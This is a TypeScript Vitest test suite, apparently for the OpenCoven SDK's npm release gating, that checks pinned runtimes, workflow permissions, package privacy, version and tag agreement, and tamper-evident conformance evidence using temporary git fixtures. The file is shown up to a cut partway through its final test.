import { execFileSync, spawnSync } from 'node:child_process';
import {
  cpSync,
  mkdtempSync,
  mkdirSync,
  readFileSync,
  rmSync,
  writeFileSync,
} from 'node:fs';
import { tmpdir } from 'node:os';
import { dirname, resolve } from 'node:path';
import { fileURLToPath } from 'node:url';

import { afterEach, describe, expect, test } from 'vitest';

import {
  readReleaseConfig,
  validateReleaseConfiguration as validateReleaseReadiness,
  validateReleaseReadiness as validateCanonicalReleaseReadiness,
} from '../scripts/release-readiness.mjs';
import * as releaseReadinessModule from '../scripts/release-readiness.mjs';
import type {
  NativeConformancePlatforms,
  ReleaseConfig,
} from '../scripts/release-readiness.d.mts';
import {
  createNpmPublishArgs,
  publishReleaseArtifacts,
} from '../scripts/publish-release-artifacts.mjs';
import { PUBLIC_PACKAGES } from '../scripts/repository-metadata.mjs';

const workspaceRoot = resolve(dirname(fileURLToPath(import.meta.url)), '..');
const fixtures: string[] = [];

interface MutablePackageManifest {
  dependencies: Record<string, string>;
  engines: {
    node: string;
  };
  private: boolean;
  version: string;
}

type MutableReleaseConfig = Omit<
  ReleaseConfig,
  | 'githubEnvironment'
  | 'conformanceEvidence'
  | 'nativeConformancePlatforms'
  | 'npmAccess'
  | 'npmCliVersion'
  | 'npmCliDistribution'
  | 'npmDistTag'
  | 'npmRegistry'
  | 'npmTrustedPublisher'
  | 'packages'
  | 'publicationCandidate'
  | 'protectedApproval'
  | 'schemaVersion'
  | 'supportedNode'
  | 'tagPrefix'
> & {
  conformanceEvidence: {
    aggregateRecord: string | null;
    artifactSet: string;
    candidateCommit: string;
    runtimeManifestSha256: string;
    issue: string;
  };
  githubEnvironment: string;
  npmTrustedPublisher: {
    repository: string;
    workflow: string;
    environment: string;
    job: string;
  };
  npmAccess: string;
  npmCliVersion: string;
  npmCliDistribution: {
    tarball: string;
    integrity: string;
    treeSha256: string;
    entrypointSha256: string;
  };
  npmDistTag: string;
  npmRegistry: string;
  packages: string[];
  publicationCandidate: {
    artifactSet: string;
    environment: string;
    job: string;
    securityReviewIssue: string;
    workflow: string;
    attestationJob: string;
  };
  protectedApproval: {
    environment: string;
    environmentId: string;
    witnessJob: string;
    witnessAttestationJob: string;
    approvalJob: string;
    approvalAttestationJob: string;
    publishJob: string;
    reviewer: {
      id: number;
      authorAssociation: string;
      permission: string;
      roleName: string;
    };
  };
  publishingEnabled: boolean;
  schemaVersion: number;
  supportedNode: {
    major: number;
    minimum: string;
  };
  nativeConformancePlatforms?: string[];
  tagPrefix: string;
  unexpected?: boolean;
};

type MutableReleaseConfigMissingRequiredField = Omit<
  MutableReleaseConfig,
  'nativeConformancePlatforms' | 'tagPrefix'
> & {
  nativeConformancePlatforms?: string[];
  tagPrefix?: string;
};

const SUPPORTED_PLATFORMS: NativeConformancePlatforms = [
  'darwin-arm64',
  'linux-x64',
  'win32-x64',
];
const SUBSTITUTED_PLATFORM_MATRIX: MutableReleaseConfig['nativeConformancePlatforms'] = [
  'darwin-arm64',
  'linux-arm64',
  'win32-x64',
];
const REORDERED_PLATFORM_MATRIX: MutableReleaseConfig['nativeConformancePlatforms'] = [
  'win32-x64',
  'linux-x64',
  'darwin-arm64',
];
const MISSING_PLATFORM_MATRIX: MutableReleaseConfig['nativeConformancePlatforms'] = [
  'darwin-arm64',
  'linux-x64',
];
const DUPLICATE_PLATFORM_MATRIX: MutableReleaseConfig['nativeConformancePlatforms'] = [
  'darwin-arm64',
  'linux-x64',
  'linux-x64',
];
const EXTRA_PLATFORM_MATRIX: MutableReleaseConfig['nativeConformancePlatforms'] = [
  'darwin-arm64',
  'linux-x64',
  'win32-x64',
  'linux-arm64',
];
const VALIDATOR_RUNTIME_PATHS = [
  '.node-version',
  '.npmrc',
  '.github/workflows/release.yml',
  'conformance/release-artifact-manifest.schema.json',
  'package.json',
  'pnpm-lock.yaml',
  'scripts/aggregate-client-v1-conformance.mjs',
  'scripts/conformance-contract.mjs',
  'scripts/create-release-artifacts.mjs',
  'scripts/github-conformance-evidence.mjs',
  'scripts/github-environment-policy.mjs',
  'scripts/github-environment-approval-evidence.mjs',
  'scripts/github-environment-approval.mjs',
  'scripts/github-release-authorization.mjs',
  'scripts/owned-temp-directory.mjs',
  'scripts/package-artifacts.mjs',
  'scripts/publication-source-identity.mjs',
  'scripts/publish-release-artifacts.mjs',
  'scripts/release-readiness.mjs',
  'scripts/release-runtime-integrity.mjs',
  'scripts/repository-metadata.mjs',
  'scripts/verify-committed-conformance-evidence.mjs',
  'scripts/verify-development-release-configuration.mjs',
  'scripts/verify-github-environment-policies.mjs',
  'scripts/verify-release-readiness.mjs',
] as const;

function createReleaseFixture(): string {
  const fixture = mkdtempSync(resolve(tmpdir(), 'opencoven-release-readiness-'));
  fixtures.push(fixture);

  cpSync(
    resolve(workspaceRoot, 'release.config.json'),
    resolve(fixture, 'release.config.json'),
  );
  cpSync(
    resolve(workspaceRoot, '.node-version'),
    resolve(fixture, '.node-version'),
  );
  cpSync(
    resolve(workspaceRoot, '.npmrc'),
    resolve(fixture, '.npmrc'),
  );
  cpSync(
    resolve(workspaceRoot, 'conformance'),
    resolve(fixture, 'conformance'),
    { recursive: true },
  );
  mkdirSync(resolve(fixture, '.github/workflows'), { recursive: true });
  cpSync(
    resolve(workspaceRoot, '.github/workflows/release.yml'),
    resolve(fixture, '.github/workflows/release.yml'),
  );

  for (const packageMetadata of PUBLIC_PACKAGES) {
    const sourceDirectory = resolve(
      workspaceRoot,
      'packages',
      packageMetadata.workspaceDirectory,
    );
    const fixtureDirectory = resolve(
      fixture,
      'packages',
      packageMetadata.workspaceDirectory,
    );
    cpSync(sourceDirectory, fixtureDirectory, {
      recursive: true,
      filter(source) {
        return (
          source === sourceDirectory ||
          source.endsWith('package.json') ||
          source.endsWith('CHANGELOG.md')
        );
      },
    });
  }

  return fixture;
}

function updateReleaseWorkflow(
  fixture: string,
  search: string,
  replacement: string,
): void {
  const workflowPath = resolve(fixture, '.github/workflows/release.yml');
  const workflow = readFileSync(workflowPath, 'utf8');
  expect(workflow).toContain(search);
  writeFileSync(workflowPath, workflow.replace(search, replacement));
}

function appendPublishWorkflowStep(fixture: string, step: string): void {
  const workflowPath = resolve(fixture, '.github/workflows/release.yml');
  const workflow = readFileSync(workflowPath, 'utf8');
  expect(workflow).toContain('\n  publish:\n');
  writeFileSync(workflowPath, `${workflow.trimEnd()}\n${step}\n`);
}

function appendRepositoryVerificationStep(
  fixture: string,
  step: string,
): void {
  const workflowPath = resolve(fixture, '.github/workflows/release.yml');
  const workflow = readFileSync(workflowPath, 'utf8');
  const jobStart = workflow.indexOf('\n  repository-verification:\n');
  const nextJob = workflow.indexOf('\n  publication-candidate:\n');
  const marker = '      - name: Require clean reviewed tree\n';
  const markerIndex = workflow.indexOf(marker, jobStart);
  expect(jobStart).toBeGreaterThan(-1);
  expect(nextJob).toBeGreaterThan(jobStart);
  expect(markerIndex).toBeGreaterThan(jobStart);
  expect(markerIndex).toBeLessThan(nextJob);
  writeFileSync(
    workflowPath,
    `${workflow.slice(0, markerIndex)}${step}\n${workflow.slice(markerIndex)}`,
  );
}

function updateJson<T extends object>(path: string, update: (value: T) => void): void {
  const value = JSON.parse(readFileSync(path, 'utf8')) as T;
  update(value);
  writeFileSync(path, `${JSON.stringify(value, null, 2)}\n`);
}

function git(root: string, args: string[]): string {
  return execFileSync('git', args, {
    cwd: root,
    encoding: 'utf8',
    env: {
      ...process.env,
      GIT_CONFIG_COUNT: '1',
      GIT_CONFIG_KEY_0: 'commit.gpgsign',
      GIT_CONFIG_VALUE_0: 'false',
    },
  }).trim();
}

function initializeReleaseFixtureRepository(root: string): void {
  git(root, ['init', '--quiet']);
  git(root, ['config', 'user.name', 'Release Readiness Test']);
  git(root, ['config', 'user.email', 'release-readiness@example.invalid']);
  git(root, [
    'remote',
    'add',
    'origin',
    'https://github.com/OpenCoven/sdk.git',
  ]);
  git(root, ['add', '.']);
  git(root, ['commit', '--quiet', '-m', 'fixture']);
}

afterEach(() => {
  for (const fixture of fixtures.splice(0)) {
    rmSync(fixture, { recursive: true, force: true });
  }
});

describe('release readiness contract', () => {
  test('keeps release readiness authoritative and rejects obsolete strictness flags', () => {
    const environment = Object.fromEntries(
      Object.entries(process.env).filter(
        ([key]) =>
          key !== 'GH_TOKEN'
          && key !== 'GITHUB_TOKEN'
          && key !== 'OPENCOVEN_GH_PATH',
      ),
    );
    const authoritativeResult = spawnSync(
      process.execPath,
      ['./scripts/verify-release-readiness.mjs'],
      {
        cwd: workspaceRoot,
        encoding: 'utf8',
        env: environment,
      },
    );
    const developmentResult = spawnSync(
      process.execPath,
      ['./scripts/verify-development-release-configuration.mjs'],
      {
        cwd: workspaceRoot,
        encoding: 'utf8',
        env: environment,
      },
    );
    const obsoleteConformanceFlag = spawnSync(
      process.execPath,
      [
        './scripts/verify-release-readiness.mjs',
        '--require-conformance-evidence',
      ],
      {
        cwd: workspaceRoot,
        encoding: 'utf8',
        env: environment,
      },
    );
    const obsoleteEnvironmentFlag = spawnSync(
      process.execPath,
      [
        './scripts/verify-release-readiness.mjs',
        '--require-live-environment-policy',
      ],
      {
        cwd: workspaceRoot,
        encoding: 'utf8',
        env: environment,
      },
    );

    expect(authoritativeResult.status).toBe(1);
    expect(authoritativeResult.stdout).toBe('');
    expect(authoritativeResult.stderr).toContain(
      'GH_TOKEN is required for authoritative GitHub environment verification',
    );
    expect(developmentResult.status).toBe(0);
    expect(developmentResult.stderr).toBe('');
    expect(JSON.parse(developmentResult.stdout)).toMatchObject({
      version: '0.1.0',
      publishingEnabled: false,
      conformanceEvidenceRecord: null,
    });
    expect(obsoleteConformanceFlag.status).toBe(1);
    expect(obsoleteConformanceFlag.stderr).toContain(
      'Unknown option --require-conformance-evidence',
    );
    expect(obsoleteEnvironmentFlag.status).toBe(1);
    expect(obsoleteEnvironmentFlag.stderr).toContain(
      'Unknown option --require-live-environment-policy',
    );
    expect(() =>
      validateCanonicalReleaseReadiness({
        root: workspaceRoot,
        requireConformanceEvidence: false,
      } as never),
    ).toThrow('Release readiness strictness is not configurable');
  });

  test('wires the non-optional evidence gate into every canonical release path', () => {
    const manifest = JSON.parse(
      readFileSync(resolve(workspaceRoot, 'package.json'), 'utf8'),
    ) as { scripts: Record<string, string> };
    const workflow = readFileSync(
      resolve(workspaceRoot, '.github/workflows/release.yml'),
      'utf8',
    );

    expect(manifest.scripts['verify:release']).toBe(
      'node ./scripts/verify-release-readiness.mjs',
    );
    expect(manifest.scripts['verify:development-release-configuration']).toBe(
      'node ./scripts/verify-development-release-configuration.mjs',
    );
    expect(manifest.scripts.verify).toContain(
      'verify:development-release-configuration',
    );
    expect(workflow).toContain('assertNoReleaseRuntimeShadows');
    expect(workflow).toContain(
      '"$node_path" "$corepack_path" pnpm@10.34.0',
    );
    expect(workflow).toContain(
      'name: Verify authoritative conformance evidence',
    );
    expect(workflow).toContain('name: Verify publish gates and release tag');
    expect(workflow).toContain('      actions: read');
    expect(workflow).toContain('      deployments: read');
    expect(workflow).toContain('      issues: read');
    expect(workflow).toContain('GH_TOKEN: ${{ github.token }}');
    expect(workflow).toContain(
      'name: opencoven-sdk-publication-${{ github.sha }}-${{ inputs.version }}',
    );
    expect(workflow).toContain('path: .artifacts/publication');
    expect(workflow).toContain(
      'f3432a45b03b2da0d270095fdd8813dc34cbea73f5fc8b18c7a384b7cf9b333a',
    );
    const ciWorkflow = readFileSync(
      resolve(workspaceRoot, '.github/workflows/ci.yml'),
      'utf8',
    );
    expect(ciWorkflow).toMatch(/^permissions:\n {2}contents: read\n/mu);
    expect(ciWorkflow).not.toContain('  actions: read');
    expect(ciWorkflow).not.toContain('  attestations: read');
    expect(ciWorkflow).not.toContain('  deployments: read');
    expect(ciWorkflow).not.toContain('  issues: read');
    expect(ciWorkflow).toMatch(
      /name: Verify exact release runtime\s+if: matrix\.node == '24\.18\.1'\s+run: corepack pnpm@10\.34\.0 verify/u,
    );
    expect(ciWorkflow).toMatch(
      /name: Verify Node 24 package compatibility\s+if: matrix\.node == '24\.x'\s+run: corepack pnpm@10\.34\.0 verify:compat/u,
    );
    expect(workflow).not.toContain('--require-conformance-evidence');
    expect(workflow).not.toContain('--require-live-environment-policy');
    const publishJobIndex = workflow.indexOf('\n  publish:\n');
    expect(publishJobIndex).toBeGreaterThan(0);
    const preflightJob = workflow.slice(0, publishJobIndex);
    const publishJob = workflow.slice(publishJobIndex);
    const preflightOnly = workflow.slice(
      workflow.indexOf('\n  preflight:\n'),
      workflow.indexOf('\n  repository-verification:\n'),
    );
    expect(
      preflightJob.indexOf('name: Pin reviewed release runtime'),
    ).toBeLessThan(preflightJob.indexOf('name: Install dependencies'));
    expect(preflightOnly).not.toContain('Create immutable publication candidate');
    const candidateJobIndex = workflow.indexOf('\n  publication-candidate:\n');
    expect(candidateJobIndex).toBeGreaterThan(
      workflow.indexOf('\n  repository-verification:\n'),
    );
    expect(workflow).toContain(
      'needs: [preflight, repository-verification]',
    );
    expect(workflow).toContain("if: inputs.mode == 'verify'");
    const candidateJob = workflow.slice(
      candidateJobIndex,
      workflow.indexOf('\n  publication-candidate-attestation:\n'),
    );
    const candidateAttestationJob = workflow.slice(
      workflow.indexOf('\n  publication-candidate-attestation:\n'),
      workflow.indexOf('\n  approval-witness:\n'),
    );
    expect(candidateJob).not.toContain('id-token: write');
    expect(candidateJob).toContain('attestations: read');
    expect(candidateAttestationJob).toContain('id-token: write');
    expect(candidateAttestationJob).toContain('attestations: write');
    expect(candidateAttestationJob).not.toContain('actions/checkout@');
    expect(candidateAttestationJob).not.toContain('run:');
    expect(publishJob).toContain(
      'name: Resolve exact publication authorization',
    );
    expect(publishJob).toContain(
      'name: Verify exact reviewed publication bytes',
    );
    expect(publishJob).toContain('attestations: read');
    expect(publishJob).not.toContain('name: Install dependencies');
    expect(publishJob).not.toContain('pnpm pack');
  });

  test('blocks candidate advancement until a named passing aggregate exists', () => {
    const config = readReleaseConfig(workspaceRoot);
    const workspaceManifest = JSON.parse(
      readFileSync(resolve(workspaceRoot, 'package.json'), 'utf8'),
    ) as {
      devDependencies: Record<string, string>;
    };
    expect(config.npmCliVersion).toBe('11.5.1');
    expect(config.npmRegistry).toBe('https://registry.npmjs.org/');
    expect(workspaceManifest.devDependencies.npm).toBeUndefined();
    expect(config.npmCliDistribution).toEqual({
      tarball: 'https://registry.npmjs.org/npm/-/npm-11.5.1.tgz',
      integrity:
        'sha512-Iy5vXZ55m8tIaSCz6bqQf9+W5XbPfoyURsgWLjOkFglqHTep6RDZqRj2sfYGeRyZvGu2HuJWm0lux0rxPQ29lQ==',
      treeSha256:
        'dbe97072240cb2048f84faade50f938bdca3ba04efa67719259f5528397f0f09',
      entrypointSha256:
        '8e5f6f3429f8cdbe693cdc29904e9d5a7b127a494bd15c804bd54c7403bfcbe7',
    });
    expect(config.conformanceEvidence).toEqual({
      issue: 'OpenCoven/sdk#38',
      artifactSet: 'conformance-candidate',
      candidateCommit: '6efceb20ddc2eabfaccb2a4904fbca1c056525bd',
      runtimeManifestSha256:
        '059c03b1318daedd9d8008cbf3b33fddf64dc0295ccb302269328551f8527098',
      aggregateRecord: null,
    });
    expect(config.publicationCandidate).toEqual({
      artifactSet: 'publication-candidate',
      environment: 'publication-candidate',
      securityReviewIssue: 'OpenCoven/sdk#40',
      workflow: '.github/workflows/release.yml',
      job: 'publication-candidate',
      attestationJob: 'publication-candidate-attestation',
    });
    expect(config.npmTrustedPublisher).toEqual({
      repository: 'OpenCoven/sdk',
      workflow: 'release.yml',
      environment: 'npm-publish',
      job: 'publish',
    });
    expect(config.protectedApproval).toEqual({
      environment: 'npm-release',
      environmentId: '20778492972',
      witnessJob: 'approval-witness',
      witnessAttestationJob: 'approval-witness-attestation',
      approvalJob: 'approval-evidence',
      approvalAttestationJob: 'approval-evidence-attestation',
      publishJob: 'publish',
      reviewer: {
        id: 68980965,
        authorAssociation: 'MEMBER',
        permission: 'admin',
        roleName: 'admin',
      },
    });
    expect(() =>
      validateReleaseReadiness({
        root: workspaceRoot,
        requireConformanceEvidence: true,
      }),
    ).toThrow('release.config.json must name a passing SDK #38 aggregate record');
  });

  test('rejects a fabricated untracked aggregate at the configured path', () => {
    const fixture = createReleaseFixture();
    const recordPath =
      'docs/client-v1-cross-repository-results/6efceb20ddc2eabfaccb2a4904fbca1c056525bd.json';
    updateJson<MutableReleaseConfig>(
      resolve(fixture, 'release.config.json'),
      (config) => {
        config.conformanceEvidence.aggregateRecord = recordPath;
      },
    );
    initializeReleaseFixtureRepository(fixture);
    mkdirSync(resolve(fixture, dirname(recordPath)), { recursive: true });
    writeFileSync(
      resolve(fixture, recordPath),
      '{"summary":{"status":"passed"}}\n',
    );

    expect(() =>
      validateReleaseReadiness({
        root: fixture,
        requireConformanceEvidence: true,
      }),
    ).toThrow(
      'release.config.json conformance evidence record must be a committed tracked regular file',
    );
  });

  test('rejects working-tree drift in a configured committed aggregate', () => {
    const fixture = createReleaseFixture();
    const recordPath =
      'docs/client-v1-cross-repository-results/6efceb20ddc2eabfaccb2a4904fbca1c056525bd.json';
    mkdirSync(resolve(fixture, dirname(recordPath)), { recursive: true });
    writeFileSync(resolve(fixture, recordPath), '{}\n');
    updateJson<MutableReleaseConfig>(
      resolve(fixture, 'release.config.json'),
      (config) => {
        config.conformanceEvidence.aggregateRecord = recordPath;
      },
    );
    initializeReleaseFixtureRepository(fixture);
    writeFileSync(
      resolve(fixture, recordPath),
      '{"summary":{"status":"passed"}}\n',
    );

    expect(() =>
      validateReleaseReadiness({
        root: fixture,
        requireConformanceEvidence: true,
      }),
    ).toThrow(
      'release.config.json conformance evidence record must match its committed bytes',
    );
  });

  test('keeps explicit non-release verification usable after evidence is configured', () => {
    const fixture = createReleaseFixture();
    const recordPath =
      'docs/client-v1-cross-repository-results/6efceb20ddc2eabfaccb2a4904fbca1c056525bd.json';
    updateJson<MutableReleaseConfig>(
      resolve(fixture, 'release.config.json'),
      (config) => {
        config.conformanceEvidence.aggregateRecord = recordPath;
      },
    );

    expect(
      validateReleaseReadiness({
        root: fixture,
        requireConformanceEvidence: false,
      }),
    ).toEqual({
      version: '0.1.0',
      publishingEnabled: false,
      packages: PUBLIC_PACKAGES.map(({ packageName }) => packageName),
      conformanceEvidenceRecord: null,
    });
  });

  test('requires every verifier runtime dependency to match the recorded validator commit', () => {
    const fixture = createReleaseFixture();
    for (const path of VALIDATOR_RUNTIME_PATHS) {
      mkdirSync(resolve(fixture, dirname(path)), { recursive: true });
      cpSync(resolve(workspaceRoot, path), resolve(fixture, path));
    }
    initializeReleaseFixtureRepository(fixture);
    const validatorCommit = git(fixture, ['rev-parse', 'HEAD']);
    writeFileSync(
      resolve(fixture, 'scripts/conformance-contract.mjs'),
      'export const drifted = true;\n',
    );
    git(fixture, ['add', 'scripts/conformance-contract.mjs']);
    git(fixture, ['commit', '--quiet', '-m', 'drift verifier']);
    const releaseCommit = git(fixture, ['rev-parse', 'HEAD']);
    const validateValidatorRuntimeFiles = (
      releaseReadinessModule as unknown as Record<string, unknown>
    ).validateValidatorRuntimeFiles;

    expect(
      validateValidatorRuntimeFiles,
      'validateValidatorRuntimeFiles must be exported',
    ).toBeTypeOf('function');
    expect(() =>
      (
        validateValidatorRuntimeFiles as (
          root: string,
          validatorCommit: string,
          releaseCommit: string,
        ) => void
      )(fixture, validatorCommit, releaseCommit),
    ).toThrow(
      'Validator runtime file scripts/conformance-contract.mjs differs from the recorded validator commit',
    );
  });

  test('requires the exact frozen Node runtime from .node-version', () => {
    const assertFrozenNodeRuntime = (
      releaseReadinessModule as unknown as Record<string, unknown>
    ).assertFrozenNodeRuntime;

    expect(
      assertFrozenNodeRuntime,
      'assertFrozenNodeRuntime must be exported',
    ).toBeTypeOf('function');
    expect(() =>
      (
        assertFrozenNodeRuntime as (
          root: string,
          actualVersion?: string,
        ) => string
      )(workspaceRoot, 'v24.18.1'),
    ).not.toThrow();
    expect(() =>
      (
        assertFrozenNodeRuntime as (
          root: string,
          actualVersion?: string,
        ) => string
      )(workspaceRoot, 'v24.18.2'),
    ).toThrow(
      'Release and conformance verification require Node v24.18.1, received v24.18.2',
    );

    const fixture = createReleaseFixture();
    writeFileSync(resolve(fixture, '.node-version'), '24.18.2\n');
    expect(() =>
      (
        assertFrozenNodeRuntime as (
          root: string,
          actualVersion?: string,
        ) => string
      )(fixture, 'v24.18.1'),
    ).toThrow(
      '.node-version must contain 24.18.1 with one trailing newline',
    );
  });

  test('does not impose the frozen release runtime on compatibility-safe checks', () => {
    const descriptor = Object.getOwnPropertyDescriptor(process, 'version');
    if (descriptor === undefined) {
      throw new Error('process.version descriptor is unavailable');
    }
    Object.defineProperty(process, 'version', {
      ...descriptor,
      value: 'v24.19.0',
    });
    try {
      expect(() =>
        validateReleaseReadiness({
          root: workspaceRoot,
        }),
      ).not.toThrow();
      expect(() =>
        validateReleaseReadiness({
          root: workspaceRoot,
          requireFrozenRuntime: true,
        }),
      ).toThrow(
        'Release and conformance verification require Node v24.18.1, received v24.19.0',
      );
    } finally {
      Object.defineProperty(process, 'version', descriptor);
    }
  });

  test('rejects uncommitted verifier runtime drift before executing it', () => {
    const fixture = createReleaseFixture();
    for (const path of VALIDATOR_RUNTIME_PATHS) {
      mkdirSync(resolve(fixture, dirname(path)), { recursive: true });
      cpSync(resolve(workspaceRoot, path), resolve(fixture, path));
    }
    initializeReleaseFixtureRepository(fixture);
    const commit = git(fixture, ['rev-parse', 'HEAD']);
    writeFileSync(
      resolve(fixture, 'scripts/conformance-contract.mjs'),
      'export const worktreeDrift = true;\n',
    );

    expect(() =>
      releaseReadinessModule.validateValidatorRuntimeFiles(
        fixture,
        commit,
        commit,
      ),
    ).toThrow(
      'Validator runtime file scripts/conformance-contract.mjs does not match the release commit working tree',
    );
  });

  test('pins release artifact and workflow entrypoints to the validator commit', () => {
    const fixture = createReleaseFixture();
    for (const path of VALIDATOR_RUNTIME_PATHS) {
      mkdirSync(resolve(fixture, dirname(path)), { recursive: true });
      cpSync(resolve(workspaceRoot, path), resolve(fixture, path));
    }
    initializeReleaseFixtureRepository(fixture);
    const validatorCommit = git(fixture, ['rev-parse', 'HEAD']);
    writeFileSync(
      resolve(fixture, 'scripts/create-release-artifacts.mjs'),
      'export const substitutedBuilder = true;\n',
    );
    git(fixture, ['add', 'scripts/create-release-artifacts.mjs']);
    git(fixture, ['commit', '--quiet', '-m', 'substitute release builder']);
    const releaseCommit = git(fixture, ['rev-parse', 'HEAD']);

    expect(() =>
      releaseReadinessModule.validateValidatorRuntimeFiles(
        fixture,
        validatorCommit,
        releaseCommit,
      ),
    ).toThrow(
      'Validator runtime file scripts/create-release-artifacts.mjs differs from the recorded validator commit',
    );
  });

  test('keeps publication disabled while packages are private', () => {
    const config = readReleaseConfig(workspaceRoot);

    expect(config.publishingEnabled).toBe(false);
    expect(() =>
      validateReleaseReadiness({
        root: workspaceRoot,
        mode: 'publish',
        version: '0.1.0',
        tag: 'sdk-v0.1.0',
      }),
    ).toThrow('release.config.json must name a passing SDK #38 aggregate record');
  });

  test('requires fixed versions and exact internal ranges', () => {
    const fixture = createReleaseFixture();
    const manifestPath = resolve(fixture, 'packages/sdk/package.json');
    updateJson<MutablePackageManifest>(manifestPath, (manifest) => {
      manifest.dependencies['@opencoven/sdk-core'] = 'workspace:*';
    });

    expect(() => validateReleaseReadiness({ root: fixture })).toThrow(
      '@opencoven/sdk dependency @opencoven/sdk-core must be workspace:0.1.0',
    );
  });

  test('rejects version and tag disagreement', () => {
    expect(() =>
      validateReleaseReadiness({
        root: workspaceRoot,
        version: '0.2.0',
        tag: 'sdk-v0.1.0',
      }),
    ).toThrow('Release tag sdk-v0.1.0 does not match version 0.2.0');
  });

  test('rejects unknown and missing release config fields', () => {
    const unknownFieldFixture = createReleaseFixture();
    const unknownFieldConfigPath = resolve(
      unknownFieldFixture,
      'release.config.json',
    );
    updateJson<MutableReleaseConfig>(unknownFieldConfigPath, (config) => {
      config.unexpected = true;
    });

    expect(() => readReleaseConfig(unknownFieldFixture)).toThrow(
      'release.config.json contains unknown field unexpected',
    );

    const missingNativeConformancePlatformsFixture = createReleaseFixture();
    const missingNativeConformancePlatformsConfigPath = resolve(
      missingNativeConformancePlatformsFixture,
      'release.config.json',
    );
    updateJson<MutableReleaseConfig>(
      missingNativeConformancePlatformsConfigPath,
      (config) => {
        delete config.nativeConformancePlatforms;
      },
    );

    expect(() => readReleaseConfig(missingNativeConformancePlatformsFixture)).toThrow(
      'release.config.json is missing required field nativeConformancePlatforms',
    );

    const missingTagPrefixFixture = createReleaseFixture();
    const missingTagPrefixConfigPath = resolve(
      missingTagPrefixFixture,
      'release.config.json',
    );
    updateJson<MutableReleaseConfigMissingRequiredField>(
      missingTagPrefixConfigPath,
      (config) => {
        delete config.tagPrefix;
      },
    );

    expect(() => readReleaseConfig(missingTagPrefixFixture)).toThrow(
      'release.config.json is missing required field tagPrefix',
    );
  });

  test('requires the canonical native conformance platform matrix', () => {
    expect(readReleaseConfig(workspaceRoot).schemaVersion).toBe(7);
    expect(readReleaseConfig(workspaceRoot).nativeConformancePlatforms).toEqual(
      SUPPORTED_PLATFORMS,
    );

    const fixture = createReleaseFixture();
    const configPath = resolve(fixture, 'release.config.json');
    updateJson<MutableReleaseConfig>(configPath, (config) => {
      config.nativeConformancePlatforms = SUBSTITUTED_PLATFORM_MATRIX;
    });

    expect(() => validateReleaseReadiness({ root: fixture })).toThrow(
      'release.config.json nativeConformancePlatforms must match the canonical 0.1 native conformance matrix',
    );

    updateJson<MutableReleaseConfig>(configPath, (config) => {
      config.nativeConformancePlatforms = REORDERED_PLATFORM_MATRIX;
    });

    expect(() => validateReleaseReadiness({ root: fixture })).toThrow(
      'release.config.json nativeConformancePlatforms must match the canonical 0.1 native conformance matrix',
    );

    updateJson<MutableReleaseConfig>(configPath, (config) => {
      config.nativeConformancePlatforms = MISSING_PLATFORM_MATRIX;
    });

    expect(() => validateReleaseReadiness({ root: fixture })).toThrow(
      'release.config.json nativeConformancePlatforms must match the canonical 0.1 native conformance matrix',
    );

    updateJson<MutableReleaseConfig>(configPath, (config) => {
      config.nativeConformancePlatforms = DUPLICATE_PLATFORM_MATRIX;
    });

    expect(() => validateReleaseReadiness({ root: fixture })).toThrow(
      'release.config.json nativeConformancePlatforms must match the canonical 0.1 native conformance matrix',
    );

    updateJson<MutableReleaseConfig>(configPath, (config) => {
      config.nativeConformancePlatforms = EXTRA_PLATFORM_MATRIX;
    });

    expect(() => validateReleaseReadiness({ root: fixture })).toThrow(
      'release.config.json nativeConformancePlatforms must match the canonical 0.1 native conformance matrix',
    );
  });

  test('requires canonical package ordering and supported engines', () => {
    const fixture = createReleaseFixture();
    const configPath = resolve(fixture, 'release.config.json');
    updateJson<MutableReleaseConfig>(configPath, (config) => {
      config.packages.reverse();
    });

    expect(() => validateReleaseReadiness({ root: fixture })).toThrow(
      'release.config.json packages must match the canonical public package order',
    );

    updateJson<MutableReleaseConfig>(configPath, (config) => {
      config.packages.reverse();
    });
    updateJson<MutablePackageManifest>(
      resolve(fixture, 'packages/core/package.json'),
      (manifest) => {
        manifest.engines.node = '>=24 <25';
      },
    );

    expect(() => validateReleaseReadiness({ root: fixture })).toThrow(
      '@opencoven/sdk-core engines.node must be >=24.18.0 <25',
    );
  });

  test('requires package versions and changelog versions to match', () => {
    const fixture = createReleaseFixture();
    updateJson<MutablePackageManifest>(
      resolve(fixture, 'packages/cave/package.json'),
      (manifest) => {
        manifest.version = '0.1.1';
      },
    );

    expect(() => validateReleaseReadiness({ root: fixture })).toThrow(
      'All release package versions must match 0.1.0',
    );

    updateJson<MutablePackageManifest>(
      resolve(fixture, 'packages/cave/package.json'),
      (manifest) => {
        manifest.version = '0.1.0';
      },
    );
    writeFileSync(
      resolve(fixture, 'packages/cave/CHANGELOG.md'),
      '# @opencoven/cave-client\n',
    );

    expect(() => validateReleaseReadiness({ root: fixture })).toThrow(
      '@opencoven/cave-client CHANGELOG.md must contain ## 0.1.0',
    );
  });

  test('enforces package privacy on both sides of the publishing lock', () => {
    const fixture = createReleaseFixture();
    updateJson<MutablePackageManifest>(
      resolve(fixture, 'packages/core/package.json'),
      (manifest) => {
        manifest.private = false;
      },
    );

    expect(() => validateReleaseReadiness({ root: fixture })).toThrow(
      '@opencoven/sdk-core must remain private while publishing is disabled',
    );

    updateJson<MutableReleaseConfig>(
      resolve(fixture, 'release.config.json'),
      (config) => {
        config.publishingEnabled = true;
      },
    );
    expect(() => validateReleaseReadiness({ root: fixture })).toThrow(
      '@opencoven/cave-client must be non-private while publishing is enabled',
    );
  });

  test('keeps post-review authorization out of descendant release config commits', () => {
    const fixture = createReleaseFixture();
    updateJson<MutableReleaseConfig & {
      publicationCandidate: MutableReleaseConfig['publicationCandidate'] & {
        securityReviewCommentId?: string;
        unlockCommit?: string;
      };
    }>(
      resolve(fixture, 'release.config.json'),
      (config) => {
        config.publicationCandidate.securityReviewCommentId = '4001';
        config.publicationCandidate.unlockCommit = 'a'.repeat(40);
      },
    );

    expect(() => readReleaseConfig(fixture)).toThrow(
      'release.config.json publicationCandidate contains unknown field securityReviewCommentId',
    );
  });

  test('validates strict SemVer and optional tag requirements', () => {
    expect(() =>
      validateReleaseReadiness({ root: workspaceRoot, version: 'v0.1.0' }),
    ).toThrow('Release version v0.1.0 must be strict SemVer');
    expect(() =>
      validateReleaseReadiness({
        root: workspaceRoot,
        version: '0.1.0',
        requireTag: true,
      }),
    ).toThrow('Release tag is required');
  });

  test('returns the canonical locked release summary', () => {
    expect(validateReleaseReadiness({ root: workspaceRoot })).toEqual({
      version: '0.1.0',
      publishingEnabled: false,
      packages: PUBLIC_PACKAGES.map(({ packageName }) => packageName),
      conformanceEvidenceRecord: null,
    });
